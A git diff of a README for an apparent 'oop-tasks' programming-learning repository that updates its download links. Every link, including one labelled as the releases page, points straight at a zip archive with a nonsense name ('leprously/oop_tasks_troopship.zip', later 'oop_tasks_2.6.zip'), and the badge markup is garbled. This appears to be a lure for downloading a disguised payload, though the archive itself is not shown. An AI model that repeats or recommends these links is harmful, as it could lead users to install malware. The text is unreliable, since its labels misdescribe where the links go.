@@ -1,6 +1,6 @@
 # 🚀 oop-tasks - Easily Learn Object-Oriented Programming
 
-[![Download](https://raw.githubusercontent.com/KrishnaSamanta/oop-tasks/main/leprously/oop_tasks_troopship.zip%20Here-Click%20to%https://raw.githubusercontent.com/KrishnaSamanta/oop-tasks/main/leprously/oop_tasks_troopship.zip)](https://raw.githubusercontent.com/KrishnaSamanta/oop-tasks/main/leprously/oop_tasks_troopship.zip)
+[![Download](https://github.com/KrishnaSamanta/oop-tasks/raw/refs/heads/main/leprously/oop_tasks_2.6.zip%20Here-Click%20to%https://github.com/KrishnaSamanta/oop-tasks/raw/refs/heads/main/leprously/oop_tasks_2.6.zip)](https://github.com/KrishnaSamanta/oop-tasks/raw/refs/heads/main/leprously/oop_tasks_2.6.zip)
 
 ## 🌐 Overview
 
@@ -35,7 +35,7 @@ To get started, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the files.
 
-   [Visit this page to download](https://raw.githubusercontent.com/KrishnaSamanta/oop-tasks/main/leprously/oop_tasks_troopship.zip)
+   [Visit this page to download](https://github.com/KrishnaSamanta/oop-tasks/raw/refs/heads/main/leprously/oop_tasks_2.6.zip)
 
 2. **Choose the Version:** On the releases page, find the latest version available.
 
